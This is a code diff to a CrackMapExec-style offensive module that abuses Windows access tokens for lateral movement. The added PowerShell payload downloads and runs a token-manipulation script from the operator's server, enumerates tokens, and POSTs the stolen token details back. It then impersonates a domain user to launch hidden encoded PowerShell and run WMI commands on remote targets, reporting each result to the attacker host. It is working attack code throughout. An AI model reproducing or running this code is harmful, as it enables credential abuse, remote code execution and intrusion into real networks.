@@ -1,6 +1,8 @@
+from StringIO import StringIO
 from core.helpers import create_ps_command, gen_random_string, obfs_ps_script
 from base64 import b64encode
-
+import sys
+import os
 
 class CMEModule:
 
@@ -25,11 +27,34 @@ class CMEModule:
             CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
         '''
 
+        if not 'TARGET' in module_options or not 'USER' in module_options or not 'DOMAIN' in module_options:
+            context.log.error('TARGET, USER and DOMAIN options are required!')
+            sys.exit(1)
+
+        if not 'CMD' in module_options and not 'CMDFILE' in module_options:
+            context.log.error('CMD or CMDFILE options are required!')
+            sys.exit(1)
+
+        if 'CMD' in module_options and 'CMDFILE' in module_options:
+            context.log.error('CMD and CMDFILE are mutually exclusive!')
+            sys.exit(1)
+
         self.target_computers = ''
         self.target_user = module_options['USER']
         self.target_domain = module_options['DOMAIN']
-        self.command = module_options['COMMAND']
-        
+
+        if 'CMD' in module_options:
+            self.command = module_options['CMD']
+        elif 'CMDFILE' in module_options:
+            path = os.path.expanduser(module_options['CMDFILE'])
+
+            if not os.path.exists(path):
+                context.log.error('Path to CMDFILE invalid!')
+                sys.exit(1)
+
+            cmdfile = open(path, 'r').read()
+            self.command = cmdfile.strip() 
+
         targets = module_options['TARGET'].split(',')
         for target in targets:
             self.target_computers += '"{}",'.format(target)
@@ -50,41 +75,44 @@ class CMEModule:
 
         #Main payload
         payload = '''
+        function Send-POSTRequest {{
+            [CmdletBinding()]
+            Param (
+                [string] $data
+            )
+            $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
+            $request.Method = 'POST';
+            $request.ContentType = 'application/x-www-form-urlencoded';
+            $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
+            $request.ContentLength = $bytes.Length;
+            $requestStream = $request.GetRequestStream();
+            $requestStream.Write( $bytes, 0, $bytes.Length );
+            $requestStream.Close();
+            $request.GetResponse();
+        }}
+
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
         $tokens = Invoke-{obfs_func} -Enum;
         foreach ($token in $tokens){{
             if ($token.Domain -eq "{domain}" -and $token.Username -eq "{user}"){{
 
-                $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-                $request.Method = 'POST';
-                $request.ContentType = 'application/x-www-form-urlencoded';
-                $bytes = [System.Text.Encoding]::ASCII.GetBytes("Found token for user " + ($token.Domain + '\\' + $token.Username));
-                $request.ContentLength = $bytes.Length;
-                $requestStream = $request.GetRequestStream();
-                $requestStream.Write( $bytes, 0, $bytes.Length );
-                $requestStream.Close();
-                $request.GetResponse();
+                $token_desc = $token | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
+                $post_back = "Found token for user " + ($token.Domain + '\\' + $token.Username) + "! `n";
+                $post_back = $post_back + $token_desc;
+                Send-POSTRequest $post_back
 
                 Invoke-{obfs_func} -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {command}";
                 return
             }}
         }}
 
-        $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
-        $request.Method = 'POST';
-        $request.ContentType = 'application/x-www-form-urlencoded';
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes("User token not present on system!");
-        $request.ContentLength = $bytes.Length;
-        $requestStream = $request.GetRequestStream();
-        $requestStream.Write( $bytes, 0, $bytes.Length );
-        $requestStream.Close();
-        $request.GetResponse();'''.format(obfs_func=self.obfs_name,
-                                          command=b64encode(second_stage.encode('UTF-16LE')),
-                                          server=context.server,
-                                          addr=context.localip,
-                                          port=context.server_port,
-                                          user=self.target_user,
-                                          domain=self.target_domain)
+        Send-POSTRequest "User token not present on system!"'''.format(obfs_func=self.obfs_name,
+                                                                       command=b64encode(second_stage.encode('UTF-16LE')),
+                                                                       server=context.server,
+                                                                       addr=context.localip,
+                                                                       port=context.server_port,
+                                                                       user=self.target_user,
+                                                                       domain=self.target_domain)
 
         context.log.debug(payload)
         payload = create_ps_command(payload)
@@ -111,22 +139,37 @@ class CMEModule:
             #This will get executed in the process that was created with the impersonated token
             elevated_ps_command = '''
             [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
-            $post_output = "Executed command on target!";
-
-            try{{
-                Invoke-WmiMethod -Path Win32_process -Name create -ComputerName @({}) -ArgumentList "{}";
-            }} catch {{
-                $post_output = "Error executing command: $_.Exception.Message";
+            function Send-POSTRequest {{
+                [CmdletBinding()]
+                Param (
+                    [string] $data
+                )
+                $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
+                $request.Method = 'POST';
+                $request.ContentType = 'application/x-www-form-urlencoded';
+                $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
+                $request.ContentLength = $bytes.Length;
+                $requestStream = $request.GetRequestStream();
+                $requestStream.Write( $bytes, 0, $bytes.Length );
+                $requestStream.Close();
+                $request.GetResponse();
             }}
-            $request = [System.Net.WebRequest]::Create('{}://{}:{}/');
-            $request.Method = 'POST';
-            $request.ContentType = 'application/x-www-form-urlencoded';
-            $bytes = [System.Text.Encoding]::ASCII.GetBytes($post_output);
-            $request.ContentLength = $bytes.Length;
-            $requestStream = $request.GetRequestStream();
-            $requestStream.Write( $bytes, 0, $bytes.Length );
-            $requestStream.Close();
-            $request.GetResponse();'''.format(self.target_computers, command_to_execute, context.server, context.localip, context.server_port)
+
+            $post_output = "";
+            $targets = @({targets});
+            foreach ($target in $targets){{
+                try{{
+                    Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $target -ArgumentList "{command}";
+                    $post_output = $post_output + "Executed command on $target! `n";
+                }} catch {{
+                    $post_output = $post_output + "Error executing command on $target $_.Exception.Message `n";
+                }}
+            }}
+            Send-POSTRequest $post_output'''.format(server=context.server, 
+                                                    addr=context.localip, 
+                                                    port=context.server_port,
+                                                    targets=self.target_computers,
+                                                    command=command_to_execute)
 
             request.wfile.write(elevated_ps_command)
 
@@ -148,4 +191,6 @@ class CMEModule:
             elif data.find('Executed command') != -1 or data.find('Error executing') != -1:
                 response.stop_tracking_host()
 
-            context.log.highlight(data.strip())
+            buf = StringIO(data.strip()).readlines()
+            for line in buf:
+                context.log.highlight(line.strip())
